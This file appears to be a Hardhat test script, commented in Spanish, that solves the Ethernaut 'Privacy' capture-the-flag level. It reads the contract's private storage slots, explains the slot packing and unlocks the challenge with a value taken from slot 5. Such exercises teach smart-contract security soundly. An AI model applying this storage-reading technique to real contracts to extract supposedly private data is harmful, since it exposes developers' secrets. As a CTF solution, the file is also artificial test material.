import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { createChallenge, submitLevel } from "./utils";
import { Interface } from "ethers/lib/utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract;
const LEVEL_ADDRESS = "0x11343d543778213221516D004ED82C45C3c8788B";
const INSTANCIA_DEL_NIVEL: string = "0x1Eda41D770CfA9B852b442206d05e56C4A6eF810";

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  //Contrato del challenge
  const challengeFactory = await ethers.getContractFactory(`Privacy`);
  if (INSTANCIA_DEL_NIVEL.length > 1) {
    challenge = challengeFactory.attach(INSTANCIA_DEL_NIVEL);
    console.log(`INSTANCIA CONTRATO CHALLENGE UTILIZADA DESDE:`, challenge.address);
  }
  else {
    const challengeAddress = await createChallenge(LEVEL_ADDRESS);
    challenge = challengeFactory.attach(challengeAddress);
    console.log(`CONTRATO CHALLENGE DEPLOYADO EN:`, challenge.address);
  }

  //Contrato atacante (Si fuera necesario)
  // const attackerFactory = await ethers.getContractFactory(`Attacker`);
  // attacker = await attackerFactory.deploy(challenge.address);
  // await attacker.deployed();
  // console.log(`CONTRATO ATACANTE DEPLOYADO EN:`, attacker.address);
});

describe("Privacy Challenge", async()=> {
  it.skip("Muestra todos los valores en storage - Privacy", async()=>{

    console.log(`\n ------------------ VALORES ALMACENADOS EN CADA SLOT ------------------ \n`);
    let locked:boolean = (Boolean)(await ethers.provider.getStorageAt(challenge.address,0));
    console.log(`EL VALOR DEL SLOT 0 ALMACENANDO LOCKED ES: ${locked}`);
    let id:BigNumber = BigNumber.from(await ethers.provider.getStorageAt(challenge.address,1));
    console.log(`EL VALOR DEL SLOT 1 ALMACENANDO ID ES: ${id}`);
    let slotCon3Variables = ethers.utils.hexValue(await ethers.provider.getStorageAt(challenge.address,2)); //hexValue me quita los ceros innecesarios.
    console.log(`EL VALOR DEL SLOT 2 ALMACENANDO AWKWARDNESS + DENOMINATION + FLATTENING (SIN CEROS INNECESARIOS) ES: ${slotCon3Variables}`);
    
    console.log(`\n ------------------ LECTURAS REFINADAS DE SLOT 2 ------------------ \n`);
    let [, , ...lecturaRefinada]= ethers.utils.arrayify(slotCon3Variables); //No tomo los primeros 2 valores porque es el valor de awkwardness separado en 2 números de 8bytes.
    console.log(`LA LECTURA REFINADA DE DENOMINATION Y FLATTENING ES: ${lecturaRefinada}` );
    let awkwardness:BigNumber = BigNumber.from(slotCon3Variables.slice(0,5)); //Tomo solamente el 0x66e1, o sea los primeros 6 caracteres ('0x' + 'awkwardness').
    console.log(`LA LECTURA REFINADA DE AWKWARDNESS ES: ${awkwardness}\n`);
    
    
    console.log(`\n ------------------ VALORES ALMACENADOS EN ARRAY "DATA" ------------------ \n`);
    let data1 = await ethers.provider.getStorageAt(challenge.address,3);
    console.log(`EL VALOR DE LA PRIMERA POSICION EN EL ARRAY DATA ES: ${data1}`);
    let data2 = await ethers.provider.getStorageAt(challenge.address,4);
    console.log(`EL VALOR DE LA PRIMERA POSICION EN EL ARRAY DATA ES: ${data2}`);
    let data3 = await ethers.provider.getStorageAt(challenge.address,5);
    console.log(`EL VALOR DE LA PRIMERA POSICION EN EL ARRAY DATA ES: ${data3}`);
  });

  it("Resuelve el challenge - Privacy", async()=> {
    let data3 = (await ethers.provider.getStorageAt(challenge.address,5)).slice(0,34); //Me quedo solo con los últimos 32 caracteres hexa. Ver comentarios al final de este archivo.
    const txUnlock = await challenge.unlock(data3, {gasLimit: 1e5});
    await txUnlock.wait();
  })
});

after(async () => {
  expect(await submitLevel(challenge.address), "DESAFÍO INCOMPLETO").to.be.true;
});

/* bool public locked = true; --> SLOT 0
  uint256 public ID = block.timestamp; --> SLOT 1
  uint8 private flattening = 10; --> SLOT 2
  uint8 private denomination = 255; --> SLOT 2 PORQUE NO SUPERA EL TAMAÑO TOTAL DEL SLOT
  uint16 private awkwardness = uint16(now); --> SLOT 2 PORQUE NO SUPERA EL TAMAÑO TOTAL DEL SLOT
  bytes32[3] private data; --> SLOT 3, 4 Y 5 DADO QUE LOS ARRAYS ESTÁTICOS SE UBICAN DE FORMA CONTIGUA, Y CADA VALOR DEL ARRAY OCUPA LOS 32 BYTES DE UN SLOT.
*/

/*Interesante: When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.
Explicación sobre Big y Little Endian: https://jeancvllr.medium.com/solidity-tutorial-all-about-bytes-9d88fdb22676
Data management: https://hackernoon.com/getting-deep-into-evm-how-ethereum-works-backstage-ac7efa1f0015
Para entender bien bytes32 y bytes16, y cuántos caracteres se necesitan en cada uno, podemos usar la regla de multiplicar por 2:
  32bytes --> 32*2=64 caracteres
  16bytes --> 16*2=32 caracteres

  Esto en realidad surge del cálculo siguiente --> 32 bytes = 32*8 bits = 256 bits. Y como se utilizan 4 bits para representar un caracter en hexa --> caracteres = 256/4 = 64
  Esto en realidad surge del cálculo siguiente --> 16 bytes = 16*8 bits = 128 bits. Y como se utilizan 4 bits para representar un caracter en hexa --> caracteres = 128/4 = 32
*/